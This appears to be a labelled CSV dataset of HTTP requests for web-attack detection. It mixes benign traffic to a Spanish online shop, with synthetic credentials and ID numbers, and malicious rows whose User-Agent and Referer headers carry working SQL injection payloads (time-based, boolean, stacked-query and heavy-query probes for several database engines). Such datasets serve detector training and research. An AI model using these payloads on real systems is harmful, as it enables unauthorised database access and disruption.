method,url,uri,query,headers,body,type
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5"")));SELECT (CASE WHEN (1057=6756) THEN 1 ELSE 1057*(SELECT 1057 UNION ALL SELECT 6756) END)--
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5' AND 1982=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- SPMK
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/autenticar.jsp,/tienda1/publico/autenticar.jsp,modo=entrar&login=leppert&pwd=tIZ9N37llo&remember=on&B1=Entrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=A462F1DCA6E67B1CF4B23D658FFAE541,,benign
POST,/tienda1/publico/registro.jsp,/tienda1/publico/registro.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=7C1CE38868EF7AAC3ECDEA857D544FE0,modo=registro&login=lemuel3&password=2edidor&nombre=Lihuen&apellidos=Obach&email=perryman%4015horas.sr&dni=28872193V&direccion=El+Cami%2C+181+5%3FA&ciudad=Baztan&cp=29197&provincia=Palencia&ntc=6879168763922210&B1=Registrar,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5` WHERE 6326=6326 AND 7510=7463#
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/pagar.jsp,/tienda1/publico/pagar.jsp,modo=insertar&precio=9498&B1=Confirmar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=1F2FEADFE19E423F8CC095812DC22DD3,,benign
POST,/tienda1/publico/autenticar.jsp,/tienda1/publico/autenticar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=C8CD1A2AC7D6063F781865F75EC33685,modo=entrar&login=tex&pwd=MuesCAr&remember=off&B1=Entrar,benign
GET,/tienda1/miembros/imagenes/castro.jpg,/tienda1/miembros/imagenes/castro.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=CBADA1666FD68798D862A7E58BF28ED8,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/%' OR (SELECT 3417 FROM (SELECT(SLEEP(5)))BdFy)#
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/anadir.jsp,/tienda1/publico/anadir.jsp,id=2&nombre=Queso+Manchego&precio=100&cantidad=13&B1=A%F1adir+al+carrito,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=B41B610A7A77835C05D011E4D6F136B7,,benign
POST,/tienda1/publico/pagar.jsp,/tienda1/publico/pagar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=C6D3C1050A43C983AA536750F760586C,modo=insertar&precio=381&B1=Pasar+por+caja,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5))) RLIKE (SELECT (CASE WHEN (9762=9451) THEN 0x4d6f7a696c6c612f352e3020285831313b20553b204c696e757820693638363b20656e2d55533b2072763a312e392e302e3929204765636b6f2f32303039303432313133205562756e74752f382e31302028696e747265706964292046697265666f782f332e302e392047544235 ELSE 0x28 END)) AND (((2244=2244
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5) OR 2252=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)-- kkOU
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/anadir.jsp,/tienda1/publico/anadir.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=3111647E4B451B1DC419D3589E2DE0E0,id=3&nombre=Queso+Manchego&precio=100&cantidad=58&B1=A%F1adir+al+carrito,benign
POST,/tienda1/miembros/editar.jsp,/tienda1/miembros/editar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=C09A177166928E96814034928C94FA5C,modo=registro&login=raquela4&password=PaJUnCiO&nombre=Nazareth&apellidos=Locatti+Lle%F3&email=boys%40schnapps.com.tk&dni=89692486F&direccion=Calle+Sicilia+42%2C+9%3FF&ciudad=Valle+de+Valdebezana&cp=29494&provincia=Salamanca&ntc=9936399902996256&B1=Registrar,benign
GET,/tienda1/publico/miembros.jsp,/tienda1/publico/miembros.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=0968B4D712564688A1C60E3F13BCE700,,benign
GET,/tienda1/imagenes/1.gif,/tienda1/imagenes/1.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=FF9E395601246C7B18B4589FB5303C00,,benign
GET,/tienda1/publico/pagar.jsp,/tienda1/publico/pagar.jsp,modo=insertar&precio=2956&B1=Confirmar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=E0586411D281AE26BDBCF5032F112579,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5')) RLIKE SLEEP(5)#
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/')) OR 2420=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND (('NnGH'='NnGH
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5"") RLIKE SLEEP(5) AND (""dERJ"" LIKE ""dERJ
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/autenticar.jsp,/tienda1/publico/autenticar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=604D18F37A2A25329D9E7337B11F0BD2,modo=entrar&login=dehaan&pwd=menorqu%EDn&remember=off&B1=Entrar,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/""))) OR 6139=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (((""bDCc""=""bDCc
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/entrar.jsp,/tienda1/publico/entrar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=2791BE3981437A3D7B3C17CCD0E58C86,errorMsg=Credenciales+incorrectas,benign
GET,/tienda1/publico/registro.jsp,/tienda1/publico/registro.jsp,modo=registro&login=gwyn&password=enmostrar&nombre=Magin&apellidos=Aylagas&email=lajos%40risiberia.cf&dni=22758022M&direccion=Pl.+Santa+Maria%2C+68%2C+8E&ciudad=Santa+Amalia&cp=23230&provincia=Navarra&ntc=9316349682018784&B1=Registrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=539C6E64F6548A90115FC46CC9377745,,benign
GET,/tienda1/publico/carrito.jsp,/tienda1/publico/carrito.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=FE103777C4E3C985EF0D8B5DC3318125,,benign
GET,/tienda1/publico/entrar.jsp,/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=F94CB11F50FFED4426E8ED814CEE1545,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/')) RLIKE (SELECT 6550 FROM (SELECT(SLEEP(5)))jchG) AND (('akkM'='akkM
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/""))) AND CHAR(87)||CHAR(99)||CHAR(67)||CHAR(78)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9392),0),5000000000),NULL) AND (((""rpFH""=""rpFH
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/vaciar.jsp,/tienda1/publico/vaciar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=9F5DAF42752B40A84D8E6FBD37644192,B2=Vaciar+carrito,benign
GET,/tienda1/miembros/index.jsp,/tienda1/miembros/index.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=A4CA5704DB4587FCA4BD92D01CEAC9ED,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/) AS LJzW WHERE 1676=1676 AND 7846=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- phjH
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/autenticar.jsp,/tienda1/publico/autenticar.jsp,modo=entrar&login=impaglia&pwd=encaramar&remember=off&B1=Entrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=7B24F31B2F449D959F4349D0E4112377,,benign
GET,/tienda1/publico/anadir.jsp,/tienda1/publico/anadir.jsp,id=2&nombre=Vino+Rioja&precio=100&cantidad=51&B1=A%F1adir+al+carrito,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=C076CDA7F17F179BAEE1E1F6A9B3F024,,benign
GET,/tienda1/publico/caracteristicas.jsp,/tienda1/publico/caracteristicas.jsp,id=2,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=87F72F0AC3CA5E25E3B5D8DDD1BC90DF,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/"")) RLIKE (SELECT 6595 FROM (SELECT(SLEEP(5)))SvQg)#
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: (CASE WHEN 6672=3541 THEN 6672 ELSE NULL END)
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5) AND MAKE_SET(4912=7526,7526)-- seYa
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/imagenes/logo.gif,/tienda1/imagenes/logo.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=7FF472C78D3A716AE14A5B4D66B393D8,,benign
GET,/tienda1/imagenes/1.gif,/tienda1/imagenes/1.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=A92383BB264B04AA3828A8C17CEE42CB,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: -4282' OR (SELECT (CASE WHEN (4422=4422) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4422) END) FROM DUAL) IS NULL AND 'ctYo'='ctYo
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/miembros.jsp,/tienda1/publico/miembros.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=AF339845D43DC84132A2386B570714A9,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5')) AND 9689=BENCHMARK(5000000,MD5(0x486f4c4a)) AND (('puzK' LIKE 'puzK
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/global/menum.jsp,/tienda1/global/menum.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=E9AF46525F74409160C1C240B1BAD495,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/' IN BOOLEAN MODE);SELECT (CASE WHEN (7756=1656) THEN 7756 ELSE 1/(SELECT 0) END)--
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5` WHERE 4424=4424 OR CHAR(83)||CHAR(68)||CHAR(105)||CHAR(88)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL)-- Qazn
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/` WHERE 3558=3558 AND 9069=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(65)||CHR(109)||CHR(88),5)--
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/registro.jsp,/tienda1/publico/registro.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=E7ECDFF6CF38F91FEC96B4E90399BD0A,modo=registro&login=suda&password=ayoTE&nombre=Benito&apellidos=Araoz+Recorda&email=kalich%40silver-knights.hn&dni=41881247H&direccion=Calle+Alfahuir%2C+149+6%3FH&ciudad=Marchamalo&cp=03110&provincia=Barcelona&ntc=4145418997110831&B1=Registrar,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5' AND ELT(4830=7432,7432) AND 'cJjI'='cJjI
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/anadir.jsp,/tienda1/publico/anadir.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=948A8807B9DD302A99A6F8947E92FD93,id=3&nombre=Queso+Manchego&precio=39&cantidad=6&B1=A%F1adir+al+carrito,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: -6280"" OR (SELECT (CASE WHEN (8586=8586) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8586) END) FROM DUAL) IS NULL AND ""kAgF"" LIKE ""kAgF
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/miembros/editar.jsp,/tienda1/miembros/editar.jsp,modo=registro&login=stanwood&password=1a7let9&nombre=Florencia&apellidos=Vargas+Cabarcos&email=sadler%40foreignoffice.ba&dni=42952758M&direccion=Ca%F1ada+De+Megias%2C+26%2C+&ciudad=Canillas+de+Abajo&cp=28510&provincia=Sevilla&ntc=3557319133727148&B1=Registrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=1E9B0B0038FA79A7B4F3B8DCF714500A,,benign
GET,/tienda1/imagenes/cmenbul.gif,/tienda1/imagenes/cmenbul.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=E650EE2D068A03583B2CA8E967A8664A,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/;SELECT (CASE WHEN (3526=1676) THEN 3526 ELSE 1/(SELECT 0) END)--
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/miembros/editar.jsp,/tienda1/miembros/editar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=09785E576713BB3F1392EFE121843D78,modo=registro&login=atkins&password=l9a9e&nombre=Nelo&apellidos=Lloret+Rossier&email=janey_pap%40vendomiatico.ml&dni=20437771V&direccion=C%2F+Alvaro+De+Bazan+25+&ciudad=Allo&cp=22376&provincia=Barcelona&ntc=7644089018801795&B1=Registrar,benign
GET,/tienda1/imagenes/2.gif,/tienda1/imagenes/2.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=390FD0FF53C4F7ABF4CADDD8233389A5,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/"")) AND 2115=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) AND ((""VkZD"" LIKE ""VkZD
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/anadir.jsp,/tienda1/publico/anadir.jsp,id=2&nombre=Vino+Rioja&precio=100&cantidad=6&B1=A%F1adir+al+carrito,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=CFECAACC63694C1C7807E504CAF24E1F,,benign
GET,/tienda1/miembros/imagenes/castro.jpg,/tienda1/miembros/imagenes/castro.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=39E67FB21554FCAD52FA85DAF548D846,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5"") OR (SELECT 7994 FROM (SELECT(SLEEP(5)))sfOn) AND (""pgAT""=""pgAT
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/registro.jsp,/tienda1/publico/registro.jsp,modo=registro&login=seelaend&password=TubuL6s8&nombre=Tulia&apellidos=Elortegi&email=schultes%40ciclismomadrile%F1o.la&dni=94900668T&direccion=Sants+De+La+Pedra+21+6C&ciudad=Trasmoz&cp=37258&provincia=Ciudad+Real&ntc=9358968631233633&B1=Registrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=57880864BC687D41D724FD3053D160B1,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5' OR (SELECT 7994 FROM (SELECT(SLEEP(5)))sfOn) AND 'iNHW' LIKE 'iNHW
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/') AND 5088=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND ('Jlyy'='Jlyy
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/entrar.jsp,/tienda1/publico/entrar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=038525B4672B36C32DF26D9ED7DEE17B,errorMsg=Credenciales+incorrectas,benign
